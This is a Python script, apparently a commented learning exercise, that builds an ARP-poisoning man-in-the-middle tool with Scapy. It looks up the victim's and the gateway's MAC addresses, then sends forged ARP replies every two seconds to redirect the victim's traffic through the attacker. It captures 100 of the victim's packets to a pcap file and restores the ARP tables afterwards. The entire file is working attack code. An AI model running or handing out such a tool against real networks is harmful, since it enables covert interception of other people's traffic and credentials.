from multiprocessing import Process                                                         # Creates separate memory spaces — for poisoning and capturing.  
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap) 
import os
import sys
import time 

# Discovers MACs based on IPs
def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)                # Builds a packet, putting ARP packet inside Ethernet frame.
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)                               # We use Send and Receive Packets for L2.
    for _, r in resp:                                                                       # Returns answered packets only.
        return r[Ether].src                                                                 # We extract the MAC address of the device that replied. 
    return None

class Arpo:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim                                                                # We initialize the variables: interface, victim and so on. 
        self.victimmac = get_mac(victim)                                                    # Recon to find the hardware addresses of the two targets.
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface                                                              # Global settings: forces Scapy to use a specific NIC.
        conf.verb = 0                                                                       # Silences Scapy's default output.

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)

    # Parallel execution - creates two workers
    def run(self):
        self.poison_thread = Process(target=self.poison)                                    # Worker 1 - Poisoner that sends fake ARP packets.
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)                                      # Worker 2 - Sniffer that captures the refirected traffic. 
        self.sniff_thread.start()

    # MITM 
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2                                                                # Makes this an ARP Reply which computers send when asked. We are sending an answer to a request the victim never asked.                                                                
        poison_victim.psrc = self.gateway                                                   # We are claiming to be the Gateway. 
        poison_victim.pdst = self.victim 
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')                                            # Contains the MAC address of the sender.
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()                                                              # Tells the Gateway that we are the Victim.
        poison_gateway.op = 2 
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL+C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)                                                               # ARP cache is temp. By sending packets every 2 sec, we keep the wound open. 

    # Capturing
    def sniff(self, count=100):
        time.sleep(5)                                                                       # Waits 5 sec to ensure the ARP cache of the Target has been poisoned before we start recording.
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim                                                  # Shows the Victim's traffic only.
        packets = sniff(count=count, filter=bpf_filter, 
                        iface=self.interface)
        wrpcap('arpo.pcap', packets)                                                        # Saves the packets into a .pcap format. 
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()                                                      # Once we have captured 100 packets, we kill the poisoning process. 
        print('Finished.')

    # Cleanup
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc = self.gateway,                                                            # The Gateway's IP.
            hwsrc = self.gatewaymac,                                                        # Sends the correct MAC address of the Gateway.
            pdst = self.victim,                                                             # The recipient.
            hwdst = 'ff:ff:ff:ff:ff:ff'),                                                   # Entire network sees the correction. 
            count = 5)                                                                      # Sends it 5 times to make sure it sticks in the ARP cache. 
        send(ARP(
            op=2,
            psrc = self.victim,                                                             # The Victim's IP.
            hwsrc = self.victimmac,                                                         # The Victim's real MAC.
            pdst = self.gateway,                                                            # The recipient.
            hwdst = 'ff:ff:ff:ff:ff:ff'),
            count = 5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arpo(victim, gateway, interface)
    myarp.run()